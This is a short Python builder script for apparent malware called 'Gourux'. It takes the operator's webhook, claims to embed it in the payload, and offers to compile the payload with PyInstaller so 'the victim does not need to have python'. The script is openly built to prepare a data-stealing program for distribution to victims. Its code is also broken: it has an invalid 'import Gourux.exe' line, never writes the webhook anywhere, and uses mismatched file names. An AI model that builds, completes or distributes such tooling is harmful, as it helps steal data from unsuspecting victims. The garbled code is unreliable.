import codecs
import os

webhook = input("What is your webhook? ")

print(
    'Added your webhook to "Gourux.exe"! type "exec" if you want to build it to a .exe file so the victim does not need to have python or you can just keep it and type "keep" and press enter to keep the "Gourux.py" file with your webhook.'
)
import Gourux.exe
choice = input("Choice [exec/keep]: ")
if choice == "exec":
    os.system("pip install pyinstaller")
    os.system("pyinstaller --onefile source/main.py")
elif choice == "keep":
    print("Keeping the main.py file with your webhook attached to it.")
    input("Enter to exit.")
else:
    print(
        'u did not type keep or exec. now it is going to be defaulted to "keep"'
    )
    quit()